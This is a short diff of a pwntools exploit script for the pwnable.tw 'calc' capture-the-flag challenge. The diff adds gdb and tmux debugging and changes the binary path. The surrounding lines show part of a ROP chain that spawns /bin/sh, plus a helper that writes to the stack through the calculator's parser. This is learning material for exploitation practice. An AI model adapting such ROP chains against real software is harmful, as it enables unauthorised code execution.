@@ -4,7 +4,9 @@ from pwn import *
 
 # p=remote('chall.pwnable.tw',10100)
 context.log_level = 'debug'
-p = process('./calc')
+context.terminal = ['tmux', 'splitw', '-h']
+p = process('/ctf/work/calc/calc')
+gdb.attach(p)
 
 keys=[0x0805c34b,0xb,0x080701d1,0,0,0x08049a21,u32('/bin'),u32('/sh\0')]
 
@@ -30,7 +32,6 @@ def write_stack(addr,content):
     else:
         recv = content - recv
         p.sendline('+'+str(addr)+'+'+str(recv))
-
     p.recv()
 
 
